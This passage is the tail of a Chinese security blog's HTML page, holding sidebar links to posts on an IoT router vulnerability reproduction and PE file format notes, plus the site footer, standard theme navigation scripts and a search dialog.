onerror="this.onerror=null;this.src='/img/404.jpg'" alt="《IoT从入门到入土》(9)--TOTOLINK_NR1800X漏洞复现及lighttpd中间件浅析"/></a><div class="content"><a class="title" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(9)--TOTOLINK_NR1800X%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8Alighttpd%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%B5%85%E6%9E%90/" title="《IoT从入门到入土》(9)--TOTOLINK_NR1800X漏洞复现及lighttpd中间件浅析">《IoT从入门到入土》(9)--TOTOLINK_NR1800X漏洞复现及lighttpd中间件浅析</a><time datetime="2022-11-10T05:43:27.000Z" title="发表于 2022-11-10 13:43:27">2022-11-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/Reverse/PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E6%95%B4%E7%90%86%EF%BC%882020%E5%B9%B42%E6%9C%8823%E6%97%A5notability%E6%89%8B%E5%86%99%E7%AC%94%E8%AE%B0%EF%BC%89/" title="PE文件格式整理（2020年2月23日notability手写笔记）"><img src="https://picsum.photos/seed/blog-cover-02/800/450" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="PE文件格式整理（2020年2月23日notability手写笔记）"/></a><div class="content"><a class="title" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/Reverse/PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E6%95%B4%E7%90%86%EF%BC%882020%E5%B9%B42%E6%9C%8823%E6%97%A5notability%E6%89%8B%E5%86%99%E7%AC%94%E8%AE%B0%EF%BC%89/" title="PE文件格式整理（2020年2月23日notability手写笔记）">PE文件格式整理（2020年2月23日notability手写笔记）</a><time datetime="2022-11-08T01:10:26.000Z" title="发表于 2022-11-08 09:10:26">2022-11-08</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2019 - 2026 By Cyberangel</span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.5"></script><script src="/js/main.js?v=5.5.5"></script><div class="js-pjax"></div><script src="/js/decode-copyright-url.js"></script><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/fireworks.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js" defer="defer"></script><script>document.addEventListener('DOMContentLoaded', () => {
+  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+  window.pjax = new Pjax({
+    elements: 'a:not([target="_blank"])',
+    selectors: pjaxSelectors,
+    cacheBust: false,
+    analytics: false,
+    scrollRestoration: false
+  })
+
+  const triggerPjaxFn = (val) => {
+    if (!val) return
+    Object.values(val).forEach(fn => {
+      try {
+        fn()
+      } catch (err) {
+        console.debug('Pjax callback failed:', err)
+      }
+    })
+  }
+
+  document.addEventListener('pjax:send', () => {
+    // removeEventListener
+    btf.removeGlobalFnEvent('pjaxSendOnce')
+    btf.removeGlobalFnEvent('themeChange')
+
+    // reset readmode
+    const $bodyClassList = document.body.classList
+    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')
+
+    triggerPjaxFn(window.globalFn.pjaxSend)
+  })
+
+  document.addEventListener('pjax:complete', () => {
+    btf.removeGlobalFnEvent('pjaxCompleteOnce')
+    document.querySelectorAll('script[data-pjax]').forEach(item => {
+      const newScript = document.createElement('script')
+      const content = item.text || item.textContent || item.innerHTML || ""
+      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+      newScript.appendChild(document.createTextNode(content))
+      item.parentNode.replaceChild(newScript, item)
+    })
+
+    triggerPjaxFn(window.globalFn.pjaxComplete)
+  })
+
+  document.addEventListener('pjax:error', e => {
+    if (e.request.status === 404) {
+      true
+        ? pjax.loadUrl('/404.html')
+        : window.location.href = e.request.responseURL
+    }
+  })
+})</script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索文章" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.5"></script></div></div></body></html>
